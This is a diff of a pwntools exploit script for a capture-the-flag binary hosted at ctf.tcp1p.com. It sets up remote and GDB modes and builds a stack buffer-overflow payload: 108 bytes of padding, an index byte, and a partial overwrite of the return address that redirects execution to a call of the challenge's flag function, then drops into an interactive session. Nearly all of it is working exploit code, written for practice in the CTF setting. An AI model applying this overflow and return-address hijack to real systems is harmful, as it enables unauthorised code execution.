@@ -1,12 +1,12 @@
 from pwn import *
 
-# NC = "nc ctf.tcp1p.com 31619"
-# NC = "nc ctf.tcp1p.com 25429"
-NC = "nc ctf.tcp1p.com 3830"
+NC = "nc ctf.tcp1p.com 50283"
 HOST = NC.split(" ")[1]
 PORT = NC.split(" ")[2]
 
 # Allows you to switch between local/GDB/remote from terminal
+
+
 def start(argv=[], *a, **kw):
     if args.GDB:  # Set GDBscript below
         return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
@@ -33,10 +33,10 @@ def find_ip(payload):
 # Specify GDB script here (breakpoints etc)
 gdbscript = """
 init-pwndbg
-continue
-""".format(
-    **locals()
-)
+b *vuln+97
+b *flag
+"""
+gdbscript.format(**locals())
 
 # Binary filename
 # exe = "./baby_pwn_1"
@@ -88,14 +88,22 @@ context.log_level = "debug"
 # 3
 # offset = 178
 
+# 4
+offset = 108
+
 # Start program
 io = start()
 
 # Build the payload
-# payload = flat({offset: [0x24]})
+padding = b"A"*offset
+payload = padding
+payload += p8(142)  # index byte terakhir dari return address
+# byte terakhir dari fungsi main+23 = call flag
+payload += p8((elf.sym['main']+23) & 0xff)
 
 # Send the payload
-io.sendlineafter(b"What is your name?", b"$" * 160)
+# io.sendlineafter(b"name?", payload)
+io.sendline(payload)
 
 # Got Shell?
 io.interactive()
